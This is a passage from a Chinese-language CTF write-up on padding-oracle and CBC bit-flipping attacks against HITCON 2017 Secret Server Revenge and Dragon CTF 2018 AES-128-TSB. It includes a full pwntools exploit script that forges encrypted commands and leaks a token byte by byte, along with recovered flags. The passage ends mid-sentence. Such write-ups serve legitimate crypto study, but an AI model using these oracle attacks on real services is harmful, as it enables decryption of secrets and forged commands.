' ), iv_encrypt ) payload += md5_indexi p . sendline ( base64 . b64encode ( payload )) res = p . recvuntil ( \" \\n \" , drop = True ) # if we receive the block for 'command not found', the hash was wrong if res == cipher_notfound : print 'Guess {} is wrong.' . format ( guess ) # otherwise we correctly guessed the hash and the command was executed else : print 'Found!' flag += chr ( guess ) print 'Flag so far:' , flag break if __name__ == \"__main__\" : main () \u6700\u540e\u7ed3\u679c\u5982\u4e0b Flag so far: Paddin9_15_ve3y_h4rd__!! } \\x 10 \\x 10 \\x 10 \\x 10 \\x 10 \\x 10 \\x 10 \\x 10 \\x 10 \\x 10 \\x 10 \\x 10 \\x 10 \\x 10 \\x 10 \\x 10 2017 HITCON Secret Server Revenge \u00b6 \u63cf\u8ff0 \u00b6 The password of zip is the flag of \"Secret Server\" \u5206\u6790 \u00b6 \u8fd9\u4e2a\u7a0b\u5e8f\u65f6\u63a5\u7740\u4e0a\u9762\u7684\u7a0b\u5e8f\u7ee7\u7eed\u641e\u7684\uff0c\u4e0d\u8fc7\u8fd9\u6b21\u8fdb\u884c\u7684\u7b80\u5355\u7684\u4fee\u6539 \u52a0\u5bc6\u7b97\u6cd5\u7684 iv \u672a\u77e5\uff0c\u4e0d\u8fc7\u53ef\u4ee5\u6839\u636e Welcome \u52a0\u5bc6\u540e\u7684\u6d88\u606f\u63a8\u7b97\u51fa\u6765\u3002 \u7a0b\u5e8f\u591a\u4e86\u4e00\u4e2a 56 \u5b57\u8282\u7684 token\u3002 \u7a0b\u5e8f\u6700\u591a\u80fd\u8fdb\u884c 340 \u64cd\u4f5c\uff0c\u56e0\u6b64\u4e0a\u8ff0\u7684\u7206\u7834\u81ea\u7136\u4e0d\u53ef\u884c \u7a0b\u5e8f\u7684\u5927\u6982\u6d41\u7a0b\u5982\u4e0b \u7ecf\u8fc7 proof of work \u53d1\u9001 \u201cWelcome!!\u201d \u52a0\u5bc6\u540e\u7684\u6d88\u606f \u5728 340 \u6b21\u64cd\u4f5c\u4e2d\uff0c\u9700\u8981\u731c\u4e2d token \u7684\u503c\uff0c\u7136\u540e\u4f1a\u81ea\u52a8\u5c06 flag \u8f93\u51fa\u3002 \u6f0f\u6d1e \u00b6 \u5f53\u7136\uff0c\u5728\u4e0a\u4e2a\u9898\u76ee\u4e2d\u5b58\u5728\u7684\u6f0f\u6d1e\uff0c\u5728\u8fd9\u4e2a\u9898\u76ee\u4e2d\u4ecd\u7136\u5b58\u5728\uff0c\u5373 \u4efb\u610f\u6267\u884c\u7ed9\u5b9a\u547d\u4ee4 \u957f\u5ea6\u622a\u65ad \u5229\u7528\u601d\u8def \u00b6 \u7531\u4e8e 340 \u7684\u6b21\u6570\u9650\u5236\uff0c\u867d\u7136\u6211\u4eec\u4ecd\u7136\u53ef\u4ee5\u83b7\u5f97 md5(token[:i]) \u52a0\u5bc6\u540e\u7684\u503c\uff08 \u8fd9\u91cc\u9700\u8981\u6ce8\u610f\u7684\u662f\u8fd9\u90e8\u5206\u52a0\u5bc6\u540e\u6070\u597d\u662f 32 \u4e2a\u5b57\u8282\uff0c\u524d 16 \u4e2a\u5b57\u8282\u662f md5 \u540e\u52a0\u5bc6\u7684\u503c\uff0c\u540e\u9762\u7684 16 \u4e2a\u5b57\u8282\u5b8c\u5168\u662f\u586b\u5145\u7684\u52a0\u5bc6\u540e\u7684\u5b57\u8282\u3002 \u8fd9\u91cc md5(token[:i]) \u7279\u6307\u524d16\u4e2a\u5b57\u8282\u3002\uff09\u3002\u4f46\u662f\uff0c\u6211\u4eec\u4e0d\u80fd\u518d\u6b21\u4e3a\u4e86\u83b7\u5f97\u4e00\u4e2a\u5b57\u7b26\u53bb\u7206\u7834 256 \u6b21\u4e86\u3002 \u65e2\u7136\u4e0d\u80fd\u591f\u7206\u7834\uff0c\u90a3\u4e48\u6211\u4eec\u6709\u6ca1\u6709\u53ef\u80fd\u4e00\u6b21\u83b7\u53d6\u4e00\u4e2a\u5b57\u8282\u7684\u5927\u5c0f\u5462\uff1f\u8fd9\u91cc\uff0c\u6211\u4eec\u518d\u6765\u68b3\u7406\u4e00\u4e0b\u8be5\u7a0b\u5e8f\u53ef\u80fd\u53ef\u4ee5\u6cc4\u6f0f\u7684\u4fe1\u606f \u67d0\u4e9b\u6d88\u606f\u7684 md5 \u503c\u52a0\u5bc6\u540e\u7684\u503c\uff0c\u8fd9\u91cc\u6211\u4eec\u53ef\u4ee5\u83b7\u53d6 md5(token[:i]) \u52a0\u5bc6\u540e\u7684\u503c\u3002 unpad \u6bcf\u6b21\u4f1a\u5bf9\u89e3\u5bc6\u540e\u7684\u6d88\u606f\u8fdb\u884c unpad\uff0c\u8fd9\u4e2a\u5b57\u8282\u662f\u6839\u636e\u89e3\u5bc6\u540e\u7684\u6d88\u606f\u7684\u6700\u540e\u4e00\u4e2a\u5b57\u8282\u6765\u51b3\u5b9a\u7684\u3002\u5982\u679c\u6211\u4eec\u53ef\u4ee5\u8ba1\u7b97\u51fa\u8fd9\u4e2a\u5b57\u8282\u7684\u5927\u5c0f\uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u53ef\u80fd\u53ef\u4ee5\u77e5\u9053\u4e00\u4e2a\u5b57\u8282\u7684\u503c\u3002 \u8fd9\u91cc\u6211\u4eec\u6df1\u5165\u5206\u6790\u4e00\u4e0b unpad \u7684\u4fe1\u606f\u6cc4\u6f0f\u3002\u5982\u679c\u6211\u4eec\u5c06\u52a0\u5bc6 IV \u548c encrypt(md5(token[:i])) \u653e\u5728\u67d0\u4e2a\u5bc6\u6587 C \u7684\u540e\u9762\uff0c\u6784\u6210 C|IV|encrypt(md5(token[:i])) \uff0c\u90a3\u4e48\u89e3\u5bc6\u51fa\u6765\u7684\u6d88\u606f\u7684\u6700\u540e\u4e00\u4e2a\u660e\u6587\u5757\u5c31\u662f md5(token[:i]) \u3002\u8fdb\u800c\uff0c\u5728 unpad \u7684\u65f6\u5019\u5c31\u662f\u5229\u7528 md5(token[:i]) \u7684\u6700\u540e\u4e00\u4e2a\u5b57\u8282\uff08 0-255\uff09\u8fdb\u884c unpad\uff0c\u4e4b\u540e\u5bf9 unpad \u540e\u7684\u5b57\u7b26\u4e32\u6267\u884c\u6307\u5b9a\u7684\u547d\u4ee4\uff08\u6bd4\u5982md5\uff09\u3002\u90a3\u4e48\uff0c\u5982\u679c\u6211\u4eec \u4e8b\u5148\u6784\u9020\u4e00\u4e9b\u6d88\u606f\u54c8\u5e0c\u540e\u52a0\u5bc6\u7684\u6837\u672c \uff0c\u7136\u540e\u5c06\u4e0a\u8ff0\u6267\u884c\u540e\u7684\u7ed3\u679c\u4e0e\u6837\u672c\u6bd4\u8f83\uff0c\u5982\u679c\u76f8\u540c\uff0c\u90a3\u4e48\u6211\u4eec\u57fa\u672c\u53ef\u4ee5\u786e\u5b9a md5(token[:i]) \u7684 \u6700\u540e\u4e00\u4e2a\u5b57\u8282 \u3002\u7136\u800c\uff0c\u5982\u679c md5(token[:i]) \u7684\u6700\u540e\u4e00\u4e2a\u5b57\u8282\u5c0f\u4e8e16\uff0c\u90a3\u4e48\u5728 unpad \u65f6\u5c31\u4f1a\u5229\u7528\u4e00\u4e9b md5 \u4e2d\u7684\u503c\uff0c\u800c\u8fd9\u90e8\u5206\u503c\uff0c\u7531\u4e8e\u5bf9\u4e8e\u4e0d\u540c\u957f\u5ea6\u7684 token[:i] \u51e0\u4e4e\u90fd\u4e0d\u4f1a\u76f8\u540c\u3002\u6240\u4ee5\u53ef\u80fd\u9700\u8981\u7279\u6b8a\u5904\u7406\u3002 \u6211\u4eec\u5df2\u7ecf\u77e5\u9053\u4e86\u8fd9\u4e2a\u95ee\u9898\u7684\u5173\u952e\uff0c\u5373\u751f\u6210\u4e0e unpad \u5b57\u8282\u5927\u5c0f\u5bf9\u5e94\u7684\u52a0\u5bc6\u7ed3\u679c\u6837\u672c\uff0c\u4ee5\u4fbf\u4e8e\u67e5\u8868\u3002 \u5177\u4f53\u5229\u7528\u601d\u8def\u5982\u4e0b \u7ed5\u8fc7 proof of work\u3002 \u83b7\u53d6 token \u52a0\u5bc6\u540e\u7684\u7ed3\u679c token_enc \uff0c\u8fd9\u91cc\u4f1a\u5728 token \u524d\u9762\u6dfb\u52a0 7 \u4e2a\u5b57\u8282 \"token: \" \u3002 \u56e0\u6b64\u52a0\u5bc6\u540e\u7684\u957f\u5ea6\u4e3a 64\u3002 \u4f9d\u6b21\u83b7\u53d6 encrypt(md5(token[:i])) \u7684\u7ed3\u679c\uff0c\u4e00\u5171\u662f 57 \u4e2a\uff0c\u5305\u62ec\u6700\u540e\u4e00\u4e2a token \u7684 padding\u3002 \u6784\u9020\u4e0e unpad \u5927\u5c0f\u5bf9\u5e94\u7684\u6837\u672c\u3002\u8fd9\u91cc\u6211\u4eec\u6784\u9020\u5bc6\u6587 token_enc|padding|IV_indexi|welcome_enc \u3002\u7531\u4e8e IV_indexi \u662f\u4e3a\u4e86\u4fee\u6539\u6700\u540e\u4e00\u4e2a\u660e\u6587\u5757\u7684\u6700\u540e\u4e00\u4e2a\u5b57\u8282\uff0c\u6240\u4ee5\u8be5\u5b57\u8282\u5904\u4e8e\u53d8\u5316\u4e4b\u4e2d\u3002\u6211\u4eec\u82e5\u60f3\u83b7\u53d6\u4e00\u4e9b\u56fa\u5b9a\u5b57\u8282\u7684\u54c8\u5e0c\u503c\uff0c\u8fd9\u90e8\u5206\u81ea\u7136\u4e0d\u80fd\u6dfb\u52a0\u3002\u56e0\u6b64\u8fd9\u91cc\u4ea7\u751f\u6837\u672c\u65f6 unpad \u7684\u5927\u5c0f\u8303\u56f4\u4e3a 17 ~ 255\u3002\u5982\u679c\u6700\u540e\u6d4b\u8bd5\u65f6 md5(token[:i]) \u7684\u6700\u540e\u4e00\u4e2a\u5b57\u8282\u5c0f\u4e8e17\u7684\u8bdd\uff0c\u57fa\u672c\u5c31\u4f1a\u51fa\u73b0\u4e00\u4e9b\u672a\u77e5\u7684\u6837\u672c\u3002\u5f88\u81ea\u7136\u7684\u4e00\u4e2a\u60f3\u6cd5\u662f\u6211\u4eec\u76f4\u63a5\u83b7\u53d6 255-17+1\u4e2a\u8fd9\u4e48\u591a\u4e2a\u6837\u672c\uff0c\u7136\u800c\uff0c\u5982\u679c\u8fd9\u6837\u505a\u7684\u8bdd\uff0c\u6839\u636e\u4e0a\u9762 340 \u7684\u6b21\u6570\uff08255-17+1+57+56>340\uff09\u9650\u5236\uff0c\u6211\u4eec\u663e\u7136\u4e0d\u80fd\u83b7\u53d6\u5230 token \u7684\u6240\u6709\u5b57\u8282\u3002\u6240\u4ee5\u8fd9\u91cc\u6211\u4eec\u9700\u8981\u60f3\u529e\u6cd5\u590d\u7528\u4e00\u4e9b\u5185\u5bb9\uff0c\u8fd9\u91cc\u6211\u4eec\u9009\u62e9\u590d\u7528 encrypt(md5(token[:i])) \u7684\u7ed3\u679c\u3002\u90a3\u4e48\u6211\u4eec\u5728\u8865\u5145 padding \u65f6\u9700\u8981\u786e\u4fdd\u4e00\u65b9\u9762\u6b21\u6570\u591f\u7528\uff0c\u53e6\u4e00\u65b9\u9762\u53ef\u4ee5\u590d\u7528\u4e4b\u524d\u7684\u7ed3\u679c\u3002\u8fd9\u91cc\u6211\u4eec\u8bbe\u7f6e unpad \u7684\u5faa\u73af\u4e3a 17 \u5230 208\uff0c\u5e76\u4f7f\u5f97 unpad \u5927\u4e8e 208 \u65f6\u6070\u597d unpad \u5230\u6211\u4eec\u53ef\u4ee5\u590d\u7528\u7684\u5730\u65b9\u3002\u8fd9\u91cc\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u5f53 md5(token[:i]) \u7684\u6700\u540e\u4e00\u4e2a\u5b57\u8282\u4e3a 0 \u65f6\uff0c\u4f1a\u5c06\u6240\u6709\u89e3\u5bc6\u540e\u7684\u660e\u6587 unpad \u6389\uff0c\u56e0\u6b64\u4f1a\u51fa\u73b0 command not found \u7684\u5bc6\u6587\u3002 \u518d\u6b21\u6784\u9020\u5bc6\u6587 token_enc|padding|IV|encrypt(md5(token[:i])) \uff0c\u90a3\u4e48\uff0c\u89e3\u5bc6\u65f6\u5373\u4f7f\u7528 md5(token[:i]) \u7684\u6700\u540e\u4e00\u4e2a\u5b57\u8282\u8fdb\u884c unpad\u3002\u5982\u679c\u8fd9\u4e2a\u5b57\u8282\u4e0d\u5c0f\u4e8e17\u6216\u8005\u4e3a0\uff0c\u5219\u53ef\u4ee5\u5904\u7406\u3002\u5982\u679c\u8fd9\u4e2a\u5b57\u8282\u5c0f\u4e8e17\uff0c\u90a3\u4e48\u663e\u7136\uff0c\u6700\u540e\u8fd4\u56de\u7ed9\u7528\u6237\u7684 md5 \u7684\u7ed3\u679c\u5e76\u4e0d\u5728\u6837\u672c\u8303\u56f4\u5185\uff0c\u90a3\u4e48\u6211\u4eec\u4fee\u6539\u5176\u6700\u540e\u4e00\u4e2a\u5b57\u8282\u7684\u6700\u9ad8\u6bd4\u7279\u4f4d\uff0c\u4f7f\u5176 unpad \u540e\u53ef\u4ee5\u843d\u5728\u6837\u672c\u8303\u56f4\u5185\u3002\u8fd9\u6837\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u731c\u51fa md5(token[:i]) \u7684\u6700\u540e\u4e00\u4e2a\u5b57\u8282\u3002 \u5728\u731c\u51fa md5(token[:i]) \u7684\u6700\u540e\u4e00\u4e2a\u5b57\u8282\u540e\uff0c\u6211\u4eec\u53ef\u4ee5\u5728\u672c\u5730\u66b4\u529b\u7834\u89e3 256 \u6b21\uff0c\u627e\u51fa\u6240\u6709\u54c8\u5e0c\u503c\u672b\u5c3e\u4e3a md5(token[:i]) \u7684\u6700\u540e\u4e00\u4e2a\u5b57\u8282\u7684\u5b57\u7b26\u3002 \u4f46\u662f\uff0c\u5728\u7b2c\u516d\u6b65\u4e2d\uff0c\u5bf9\u4e8e\u4e00\u4e2a md5(token[:i]) \u53ef\u80fd\u4f1a\u627e\u51fa\u591a\u4e2a\u5907\u9009\u5b57\u7b26\uff0c\u56e0\u4e3a\u6211\u4eec\u53ea\u9700\u8981\u4f7f\u5f97\u5176\u672b\u5c3e\u5b57\u8282\u662f\u7ed9\u5b9a\u5b57\u8282\u5373\u53ef\u3002 \u90a3\u4e48\uff0c\u95ee\u9898\u6765\u4e86\uff0c\u5982\u4f55\u5220\u9664\u4e00\u4e9b\u591a\u4f59\u7684\u5907\u9009\u5b57\u7b26\u4e32\u5462\uff1f\u8fd9\u91cc\u6211\u5c31\u9009\u62e9\u4e86\u4e00\u4e2a\u5c0f trick\uff0c\u5373\u5728\u9010\u5b57\u8282\u679a\u4e3e\u65f6\uff0c\u540c\u65f6\u679a\u4e3e\u51fa token \u7684 padding\u3002\u7531\u4e8e padding \u662f 0x01 \u662f\u56fa\u5b9a\u7684\uff0c\u6240\u4ee5\u6211\u4eec\u53ea\u9700\u8981\u8fc7\u6ee4\u51fa\u6240\u6709\u7ed3\u5c3e\u4e0d\u662f 0x01 \u7684token \u5373\u53ef\u3002 \u8fd9\u91cc\uff0c\u5728\u6d4b\u8bd5\u65f6\uff0c\u5c06\u4ee3\u7801\u4e2d sleep \u6ce8\u91ca\u6389\u4e86\u3002\u4ee5\u4fbf\u4e8e\u52a0\u5feb\u4ea4\u4e92\u901f\u5ea6\u3002\u5229\u7528\u4ee3\u7801\u5982\u4e0b from pwn import * import base64 , time , random , string from Crypto.Cipher import AES from Crypto.Hash import SHA256 , MD5 #context.log_level = 'debug' p = remote ( '127.0.0.1' , 7777 ) def strxor ( str1 , str2 ): return '' . join ([ chr ( ord ( c1 ) ^ ord ( c2 )) for c1 , c2 in zip ( str1 , str2 )]) def pad ( msg ): pad_length = 16 - len ( msg ) % 16 return msg + chr ( pad_length ) * pad_length def unpad ( msg ): return msg [: - ord ( msg [ - 1 ])] # remove pad def flipplain ( oldplain , newplain , iv ): \"\"\"flip oldplain to new plain, return proper iv\"\"\" return strxor ( strxor ( oldplain , newplain ), iv ) def bypassproof (): p . recvuntil ( 'SHA256(XXXX+' ) lastdata = p . recvuntil ( ')' , drop = True ) p . recvuntil ( ' == ' ) digest = p . recvuntil ( ' \\n Give me XXXX:' , drop = True ) def proof ( s ): return SHA256 . new ( s + lastdata ) . hexdigest () == digest data = pwnlib . util . iters . mbruteforce ( proof , string . ascii_letters + string . digits , 4 , method = 'fixed' ) p . sendline ( data ) def sendmsg ( iv , cipher ): payload = iv + cipher payload = base64 . b64encode ( payload ) p . sendline ( payload ) def recvmsg (): data = p . recvuntil ( \" \\n \" , drop = True ) data = base64 . b64decode ( data ) return data [: 16 ], data [ 16 :] def getmd5enc ( i , cipher_token , cipher_welcome , iv ): \"\"\"return encrypt( md5( token[:i+1] ) )\"\"\" ## keep iv[7:] do not change, so decrypt msg[7:] won't change get_md5_iv = flipplain ( \"token: \" . ljust ( 16 , ' \\x00 ' ), \"get-md5\" . ljust ( 16 , ' \\x00 ' ), iv ) payload = cipher_token ## calculate the proper last byte number last_byte_iv = flipplain ( pad ( \"Welcome!!\" ), \"a\" * 15 + chr ( len ( cipher_token ) + 16 + 16 - ( 7 + i + 1 )), iv ) payload += last_byte_iv + cipher_welcome sendmsg ( get_md5_iv , payload ) return recvmsg () def get_md5_token_indexi ( iv_encrypt , cipher_welcome , cipher_token ): md5_token_idxi = [] for i in range ( len ( cipher_token ) - 7 ): log . info ( \"idx i: {} \" . format ( i )) _ , md5_indexi = getmd5enc ( i , cipher_token , cipher_welcome , iv_encrypt ) assert ( len ( md5_indexi ) == 32 ) # remove the last 16 byte for padding md5_token_idxi . append ( md5_indexi [: 16 ]) return md5_token_idxi def doin ( unpadcipher , md5map , candidates , flag ): if unpadcipher in md5map : lastbyte = md5map [ unpadcipher ] else : lastbyte = 0 if flag == 0 : lastbyte ^= 0x80 newcandidates = [] for x in candidates : for c in range ( 256 ): if MD5 . new ( x + chr ( c )) . digest ()[ - 1 ] == chr ( lastbyte ): newcandidates . append ( x + chr ( c )) candidates = newcandidates print candidates return candidates def main (): bypassproof () # result of encrypted Welcome!! iv_encrypt , cipher_welcome = recvmsg () log . info ( \"cipher welcome is : \" + cipher_welcome ) # execute get-token get_token_iv = flipplain ( pad ( \"Welcome!!\" ), pad ( \"get-token\" ), iv_encrypt ) sendmsg ( get_token_iv , cipher_welcome ) _ , cipher_token = recvmsg () token_len = len ( cipher_token ) log . info ( \"cipher token is : \" + cipher_token ) # get command not found cipher sendmsg ( iv_encrypt , cipher_welcome ) _ , cipher_notfound = recvmsg () # get encrypted(token[:i+1]),57 times md5_token_idx_list = get_md5_token_indexi ( iv_encrypt , cipher_welcome , cipher_token ) # get md5map for each unpadsize, 209-17 times # when upadsize>208, it will unpad ciphertoken # then we can reuse md5map = dict () for unpadsize in range ( 17 , 209 ): log . info ( \"get unpad size {} cipher\" . format ( unpadsize )) get_md5_iv = flipplain ( \"token: \" . ljust ( 16 , ' \\x00 ' ), \"get-md5\" . ljust ( 16 , ' \\x00 ' ), iv_encrypt ) ## padding 16*11 bytes padding = 16 * 11 * \"a\" ## calculate the proper last byte number, only change the last byte ## set last_byte_iv = iv_encrypted[:15] | proper byte last_byte_iv = flipplain ( pad ( \"Welcome!!\" ), pad ( \"Welcome!!\" )[: 15 ] + chr ( unpadsize ), iv_encrypt ) cipher = cipher_token + padding + last_byte_iv + cipher_welcome sendmsg ( get_md5_iv , cipher ) _ , unpadcipher = recvmsg () md5map [ unpadcipher ] = unpadsize # reuse encrypted(token[:i+1]) for i in range ( 209 , 256 ): target = md5_token_idx_list [ 56 - ( i - 209 )] md5map [ target ] = i candidates = [ \"\" ] # get the byte token[i], only 56 byte for i in range ( token_len - 7 ): log . info ( \"get token[ {} ]\" . format ( i )) get_md5_iv = flipplain ( \"token: \" . ljust ( 16 , ' \\x00 ' ), \"get-md5\" . ljust ( 16 , ' \\x00 ' ), iv_encrypt ) ## padding 16*11 bytes padding = 16 * 11 * \"a\" cipher = cipher_token + padding + iv_encrypt + md5_token_idx_list [ i ] sendmsg ( get_md5_iv , cipher ) _ , unpadcipher = recvmsg () # already in or md5[token[:i]][-1]='\\x00' if unpadcipher in md5map or unpadcipher == cipher_notfound : candidates = doin ( unpadcipher , md5map , candidates , 1 ) else : log . info ( \"unpad size 1-16\" ) # flip most significant bit of last byte to move it in a good range cipher = cipher [: - 17 ] + strxor ( cipher [ - 17 ], ' \\x80 ' ) + cipher [ - 16 :] sendmsg ( get_md5_iv , cipher ) _ , unpadcipher = recvmsg () if unpadcipher in md5map or unpadcipher == cipher_notfound : candidates = doin ( unpadcipher , md5map , candidates , 0 ) else : log . info ( 'oh my god,,,, it must be in...' ) exit () print len ( candidates ) # padding 0x01 candidates = filter ( lambda x : x [ - 1 ] == chr ( 0x01 ), candidates ) # only 56 bytes candidates = [ x [: - 1 ] for x in candidates ] print len ( candidates ) assert ( len ( candidates [ 0 ]) == 56 ) # check-token check_token_iv = flipplain ( pad ( \"Welcome!!\" ), pad ( \"check-token\" ), iv_encrypt ) sendmsg ( check_token_iv , cipher_welcome ) p . recvuntil ( \"Give me the token! \\n \" ) p . sendline ( base64 . b64encode ( candidates [ 0 ])) print p . recv () p . interactive () if __name__ == \"__main__\" : main () \u6548\u679c\u5982\u4e0b ... 79 1 hitcon { uNp@d_M3th0D_i5_am4Z1n9! } Teaser Dragon CTF 2018 AES-128-TSB \u00b6 \u8fd9\u4e2a\u9898\u76ee\u8fd8\u662f\u86ee\u6709\u610f\u601d\u7684\uff0c\u9898\u76ee\u63cf\u8ff0\u5982\u4e0b Haven't you ever thought that GCM mode is overcomplicated and there must be a simpler way to achieve Authenticated Encryption? Here it is! Server: aes-128-tsb.hackable.software 1337 server.py \u9644\u4ef6\u4ee5\u53ca\u6700\u540e\u7684 exp \u81ea\u884c\u5230 ctf-challenge \u4ed3\u5e93\u4e0b\u5bfb\u627e\u3002 \u9898\u76ee\u7684\u57fa\u672c\u6d41\u7a0b\u4e3a \u4e0d\u65ad\u63a5\u6536 a \u548c b \u4e24\u4e2a\u5b57\u7b26\u4e32\uff0c\u5176\u4e2d a \u4e3a\u660e\u6587\uff0cb \u4e3a\u5bc6\u6587\uff0c\u6ce8\u610f b \u5728\u89e3\u5bc6\u540e\u9700\u8981\u6ee1\u8db3\u5c3e\u90e8\u6070\u597d\u7b49\u4e8e iv\u3002 \u5982\u679c a \u548c b \u76f8\u7b49\uff0c\u90a3\u4e48\u6839\u636e a \u4e3a gimme_flag \uff0c\u8f93\u51fa\u52a0\u5bc6\u540e\u7684 flag\u3002 \u5426\u5219\uff0c\u8f93\u51fa\u4e00\u4e32\u968f\u673a\u52a0\u5bc6\u7684\u5b57\u7b26\u4e32\u3002 \u5426\u5219\u8f93\u51fa\u4e00\u4e32\u660e\u6587\u7684\u5b57\u7b26\u4e32\u3002 \u6b64\u5916\uff0c\u6211\u4eec\u8fd8\u53ef\u4ee5\u53d1\u73b0\u9898\u76ee\u4e2d\u7684 unpad \u5b58\u5728\u95ee\u9898\uff0c\u53ef\u4ee5\u622a\u65ad\u6307\u5b9a\u957f\u5ea6\u3002 def unpad ( msg ): if not msg : return '' return msg [: - ord ( msg [ - 1 ])] \u4e00\u5f00\u59cb\uff0c\u5f88\u76f4\u63a5\u7684\u601d\u8def\u662f a \u548c b \u7684\u957f\u5ea6\u90fd\u8f93\u5165 0 \uff0c\u90a3\u4e48\u53ef\u4ee5\u76f4\u63a5\u7ed5\u8fc7 a==b \u68c0\u67e5\uff0c\u83b7\u53d6\u4e00\u4e32\u968f\u673a\u5bc6\u6587\u52a0\u5bc6\u7684\u5b57\u7b26\u4e32\u3002\u7136\u800c\u4f3c\u4e4e\u5e76\u6ca1\u6709\u4ec0\u4e48\u4f5c\u7528\uff0c\u6211\u4eec\u6765\u5206\u6790\u4e00\u4e0b\u52a0\u5bc6\u7684\u6d41\u7a0b def tsb_encrypt ( aes , msg ): msg = pad ( msg ) iv = get_random_bytes ( 16 ) prev_pt = iv prev_ct = iv ct = '' for block in split_by ( msg , 16 ) + [ iv ]: ct_block = xor ( block , prev_pt ) ct_block = aes . encrypt ( ct_block ) ct_block = xor ( ct_block , prev_ct ) ct += ct_block prev_pt = block prev_ct = ct_block return iv + ct \u4e0d\u59a8\u5047\u8bbe P_0=iv,C_0=iv P_0=iv,C_0=iv \uff0c\u5219 C_i=C_{i-1}\\oplus E(P_{i-1} \\oplus P_i) C_i=C_{i-1}\\oplus E(P_{i-1} \\oplus P_i) \u90a3\u4e48\uff0c\u5047\u8bbe\u6d88\u606f\u957f\u5ea6\u4e3a 16\uff0c\u4e0e\u6211\u4eec\u60f3\u8981\u5f97\u5230\u7684 gimme_flag padding \u540e\u957f\u5ea6\u7c7b\u4f3c\uff0c\u5219 C_1=IV\\oplus E( IV \\oplus P_1) C_1=IV\\oplus E( IV \\oplus P_1) C_2=C_1 \\oplus E(P_1 \\oplus IV) C_2=C_1 \\oplus E(P_1 \\oplus IV) \u53ef\u4ee5\u5f88\u5bb9\u6613\u7684\u53d1\u73b0 C_2=IV C_2=IV \u3002 \uff08 \u76d7\u56fe \uff0c\u4e0b\u9762\u7684\u56fe\u7247\u66f4\u52a0\u6e05\u6670 \u53cd\u8fc7\u6765\u60f3\uff0c\u5982\u679c\u6211\u4eec\u5411\u670d\u52a1\u5668\u53d1\u9001 iv+c+iv \uff0c\u90a3\u4e48\u603b\u80fd\u7ed5\u8fc7 tsb_decrypt \u7684 mac \u68c0\u67e5 def tsb_decrypt ( aes , msg ): iv , msg = msg [: 16 ], msg [ 16 :] prev_pt = iv prev_ct = iv pt = '' for block in split_by ( msg , 16 ): pt_block = xor ( block , prev_ct ) pt_block = aes . decrypt ( pt_block ) pt_block = xor ( pt_block , prev_pt ) pt += pt_block prev_pt = pt_block prev_ct = block pt , mac = pt [: - 16 ], pt [ - 16 :] if mac != iv : raise CryptoError () return unpad ( pt ) \u90a3\u4e48\u6b64\u65f6\uff0c\u670d\u52a1\u5668\u89e3\u5bc6\u540e\u7684\u6d88\u606f\u5219\u662f unpad(IV \\oplus D(C_1 \\oplus IV)) unpad(IV \\oplus D(C_1 \\oplus IV)) \u83b7\u53d6\u660e\u6587\u6700\u540e\u4e00\u4e2a\u5b57\u8282 \u00b6 \u6211\u4eec\u53ef\u4ee5\u8003\u8651\u63a7\u5236 D \u89e3\u5bc6\u7684\u6d88\u606f\u4e3a\u5e38\u6570\u503c\uff0c\u6bd4\u5982\u5168\u96f6\uff0c\u5373 C1=IV \uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u53ef\u4ee5\u4ece 0 \u5230 255 \u679a\u4e3e IV \u7684\u6700\u540e\u4e00\u4e2a\u5b57\u8282\uff0c\u5f97\u5230 IV \\oplus D(C_1 \\oplus IV) IV \\oplus D(C_1 \\oplus IV) \u7684\u6700\u540e\u4e00\u4e2a\u5b57\u8282\u4e5f\u662f 0~255\u3002\u800c\u53ea\u6709\u662f 1~15 \u7684\u65f6\u5019\uff0c unpad \u64cd\u4f5c\u8fc7\u540e\uff0c\u6d88\u606f\u957f\u5ea6\u4e0d\u4e3a 0\u3002\u56e0\u6b64\uff0c\u6211\u4eec\u53ef\u4ee5\u5728\u679a\u4e3e\u65f6\u7edf\u8ba1\u7a76\u7adf\u54ea\u4e9b\u6570\u5b57\u5bfc\u81f4\u4e86\u957f\u5ea6\u4e0d\u4e3a\u96f6\uff0c\u5e76\u6807\u8bb0\u4e3a 1\uff0c\u5176\u4f59\u6807\u8bb0\u4e3a 0\u3002 def getlast_byte ( iv , block ): iv_pre = iv [: 15 ] iv_last = ord ( iv [ - 1 ]) tmp = [] print ( 'get last byte' ) for i in range ( 256 ): send_data ( '' ) iv = iv_pre + chr ( i ) tmpblock = block [: 15 ] + chr ( i ^ ord ( block [ - 1 ]) ^ iv_last ) payload = iv + tmpblock + iv send_data ( payload ) length , data = recv_data () if 'Looks' in data : tmp . append ( 1 ) else : tmp . append ( 0 ) last_bytes = [] for i in range ( 256 ): if tmp == xor_byte_map [ i ][ 0 ]: last_bytes . append ( xor_byte_map [ i ][ 1 ]) print ( 'possible last byte is ' + str ( last_bytes )) return last_bytes \u6b64\u5916\uff0c\u6211\u4eec\u53ef\u4ee5\u5728\u6700\u521d\u7684\u65f6\u5019\u6253\u8868\u83b7\u53d6\u6700\u540e\u4e00\u4e2a\u5b57\u8282\u6240\u6709\u7684\u53ef\u80fd\u60c5\u51b5\uff0c\u8bb0\u5f55\u5728 xor_byte_map \u4e2d\u3002 \"\"\" every item is a pair [a,b] a is the xor list b is the idx which is zero when xored \"\"\" xor_byte_map = [] for i in range ( 256 ): a = [] b = 0 for j in range ( 256 ): tmp = i ^ j if tmp > 0 and tmp <= 15 : a . append ( 1 ) else : a . append ( 0 ) if tmp == 0 : b = j xor_byte_map . append ([ a , b ]) \u901a\u8fc7\u4e0e\u8fd9\u4e2a\u8868\u8fdb\u884c\u5bf9\u6bd4\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u77e5\u9053\u6700\u540e\u4e00\u4e2a\u5b57\u8282\u53ef\u80fd\u7684\u60c5\u51b5\u3002 \u89e3\u5bc6\u4efb\u610f\u52a0\u5bc6\u5757 \u00b6 \u5728\u83b7\u53d6\u4e86\u660e\u6587\u6700\u540e\u4e00\u4e2a\u5b57\u8282\u540e\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u5229\u7528 unpad \u7684\u6f0f\u6d1e\uff0c\u4ece\u957f\u5ea6 1 \u679a\u4e3e\u5230\u957f\u5ea6 15 \u6765\u83b7\u5f97\u5bf9\u5e94\u7684\u660e\u6587\u5185\u5bb9\u3002 def dec_block ( iv , block ): last_bytes = getlast_byte ( iv , block ) iv_pre = iv [: 15 ] iv_last = ord ( iv [ - 1 ]) print ( 'try to get 